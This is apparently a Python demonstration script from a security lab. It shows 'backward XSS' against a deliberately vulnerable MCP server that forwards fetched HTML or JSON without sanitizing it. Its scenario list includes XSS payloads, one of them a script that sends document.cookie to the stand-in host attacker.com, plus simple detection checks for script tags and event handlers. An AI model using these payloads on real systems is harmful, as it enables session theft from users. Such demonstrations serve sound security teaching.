#!/usr/bin/env python3
"""
Backward XSS (Cross-Site Scripting) Attack Demonstrations

This script demonstrates Backward XSS attack techniques against the vulnerable MCP server.

Backward XSS Attack: An external service (XSS service) returns malicious HTML/JavaScript
content. The MCP server fetches this content and forwards it to users without sanitization,
allowing XSS payloads to execute in the user's browser.

Vulnerability: The MCP server has an http_get tool that fetches content from external
services and returns it without sanitization. If an external service returns malicious
HTML/JavaScript, the MCP forwards it unsanitized, allowing XSS attacks.

Attack Flow:
1. Attacker calls MCP server with URL to XSS service
2. MCP server fetches HTML/JSON with XSS payloads from XSS service
3. MCP returns unsanitized content to attacker/user
4. XSS payloads execute in user's browser (if content is rendered)
"""

import asyncio
import sys
import json
import requests
import subprocess
import time
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# Track background processes for cleanup
background_processes = []


# Backward XSS Attack Scenarios
# Demonstrates how external services can return malicious content
# that gets forwarded by MCP without sanitization

BACKWARD_XSS_ATTACK_SCENARIOS = [
    {
        "name": "Backward XSS - Script Tags in HTML",
        "description": "XSS service returns HTML with <script> tags containing malicious JavaScript",
        "url": "http://127.0.0.1:8003/page",
        "expected": "MCP fetches HTML with <script> tags and returns it unsanitized",
        "xss_type": "script_tags",
        "payload": "<script>alert('XSS Attack Successful!')</script>"
    },
    {
        "name": "Backward XSS - Event Handlers in HTML",
        "description": "XSS service returns HTML with event handlers (onerror, onclick, etc.)",
        "url": "http://127.0.0.1:8003/widget",
        "expected": "MCP fetches HTML with event handlers and returns it unsanitized",
        "xss_type": "event_handlers",
        "payload": "onerror=\"alert('XSS')\""
    },
    {
        "name": "Backward XSS - JSON with XSS Payload",
        "description": "XSS service returns JSON with XSS payload in content field",
        "url": "http://127.0.0.1:8003/news",
        "expected": "MCP fetches JSON with XSS payload in content and returns it unsanitized",
        "xss_type": "json_xss",
        "payload": "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
    }
]


class MCPClientWrapper:
    """Wrapper to make MCP client work for direct tool calls"""
    
    def __init__(self):
        self.session = None
        self.server_params = None
        
    async def initialize(self):
        """Initialize connection to MCP server"""
        project_root = Path(__file__).parent.parent.parent
        
        self.server_params = StdioServerParameters(
            command="python",
            args=["-m", "server.vulnerable_server"],
            env=None,
            cwd=str(project_root)
        )
        
        self.stdio_context = stdio_client(self.server_params)
        self.stdio_transport = await self.stdio_context.__aenter__()
        read, write = self.stdio_transport
        
        self.session_context = ClientSession(read, write)
        self.session = await self.session_context.__aenter__()
        await self.session.initialize()
    
    async def call_tool(self, tool_name: str, arguments: dict) -> dict:
        """Call a tool on the MCP server"""
        if not self.session:
            raise RuntimeError("MCP client not initialized")
            
        try:
            result = await self.session.call_tool(tool_name, arguments)
            if result.content:
                content_text = result.content[0].text if result.content else ""
                try:
                    return json.loads(content_text)
                except json.JSONDecodeError:
                    return {"raw": content_text}
            return {"status": "success"}
        except Exception as e:
            return {"error": str(e)}
    
    async def cleanup(self):
        """Clean up connections"""
        if hasattr(self, 'session_context') and self.session_context:
            await self.session_context.__aexit__(None, None, None)
        if hasattr(self, 'stdio_context') and self.stdio_context:
            await self.stdio_context.__aexit__(None, None, None)


async def create_mcp_client():
    """Create and initialize MCP client"""
    client = MCPClientWrapper()
    await client.initialize()
    return client


async def run_xss_attack(mcp_client, attack_scenario):
    """Run a single XSS attack scenario"""
    
    print(f"\n{'─'*70}")
    print(f"Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']}")
    print(f"{'─'*70}")
    print(f"URL: {attack_scenario['url']}")
    print(f"Payload: {attack_scenario['payload']}")
    print()
    
    try:
        result = await mcp_client.call_tool("http_get", {"url": attack_scenario['url']})
        
        if result.get("status") == "success":
            content = result.get("content", "")
            
            # Extract content from JSON if needed
            if isinstance(content, dict):
                content_str = json.dumps(content)
            elif isinstance(content, str):
                content_str = content
            else:
                content_str = str(content)
            
            # Check for XSS payloads
            xss_detected = False
            detected_types = []
            
            if "<script" in content_str.lower():
                detected_types.append("script tags")
                xss_detected = True
            if "onerror" in content_str.lower() or "onclick" in content_str.lower():
                detected_types.append("event handlers")
                xss_detected = True
            if "javascript:" in content_str.lower():
                detected_types.append("javascript: protocol")
                xss_detected = True
            
            if xss_detected:
                print(f"✗ VULNERABILITY: XSS payload detected in response")
                print(f"  Detected: {', '.join(detected_types)}")
                print(f"  Status: Attack SUCCESSFUL - unsanitized content returned")
                print(f"  Risk: If rendered in browser, XSS will execute")
            else:
                print(f"✓ No XSS patterns detected")
        else:
            print(f"✗ Error: {result.get('message', 'Unknown error')}")
            
    except Exception as e:
        print(f"✗ Error: {e}")
    
    await asyncio.sleep(0.5)


def check_service_running(port: int) -> bool:
    """Check if a service is running on the given port"""
    try:
        response = requests.get(f"http://127.0.0.1:{port}/", timeout=1)
        return response.status_code == 200
    except:
        return False


def start_service(name: str, module: str, port: int) -> subprocess.Popen:
    """Start a service in the background"""
    print(f"[START] Starting {name} on port {port}...")
    try:
        process = subprocess.Popen(
            [sys.executable, "-m", module],
            cwd=str(project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait for service to start (check multiple times)
        max_attempts = 10
        for attempt in range(max_attempts):
            time.sleep(0.5)
            if check_service_running(port):
                print(f"[OK] {name} started successfully (PID: {process.pid})")
                return process
            if process.poll() is not None:
                # Process died
                stderr = process.stderr.read() if process.stderr else "Unknown error"
                print(f"[ERROR] {name} process died: {stderr}")
                return None
        
        print(f"[WARNING] {name} may not have started properly")
        return process
    except Exception as e:
        print(f"[ERROR] Failed to start {name}: {e}")
        return None


async def main():
    """Main function to run backward XSS attack demonstrations"""
    
    print("\n" + "="*70)
    print("  BACKWARD XSS ATTACK DEMONSTRATION")
    print("="*70)
    print("\nDemonstrating Backward XSS attacks against vulnerable MCP server.")
    print("The server has no protection, so attacks will succeed.")
    print("\n" + "="*70 + "\n")
    
    # Check if XSS service is running
    if not check_service_running(8003):
        print("Starting XSS service (port 8003)...")
        xss_service = start_service("XSS Service", "external_service.xss_service", 8003)
        if xss_service:
            background_processes.append(xss_service)
            await asyncio.sleep(2)
        else:
            print("ERROR: Failed to start XSS service")
            return
    else:
        print("XSS service is running\n")
    
    # Number the attacks
    for i, attack in enumerate(BACKWARD_XSS_ATTACK_SCENARIOS, 1):
        attack['number'] = i
    
    mcp_client = await create_mcp_client()
    
    for attack_scenario in BACKWARD_XSS_ATTACK_SCENARIOS:
        await run_xss_attack(mcp_client, attack_scenario)
    
    await mcp_client.cleanup()
    
    # Summary
    print(f"\n{'='*70}")
    print("  SUMMARY")
    print("="*70)
    print(f"\nAttacks tested: {len(BACKWARD_XSS_ATTACK_SCENARIOS)}")
    print("\nKey Takeaways:")
    print("  • Backward XSS: external services return malicious content")
    print("  • MCP server fetches content without sanitization")
    print("  • Unsanitized content is forwarded to users")
    print("  • XSS payloads execute in user's browser if content is rendered")
    print("\n" + "="*70 + "\n")
    
    # Cleanup
    print("Cleaning up background services...")
    for process in background_processes:
        try:
            process.terminate()
            process.wait(timeout=2)
        except:
            try:
                process.kill()
            except:
                pass
    print("Done.\n")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\nInterrupted. Cleaning up...")
        for process in background_processes:
            try:
                process.terminate()
            except:
                pass
        print("Exiting...\n")

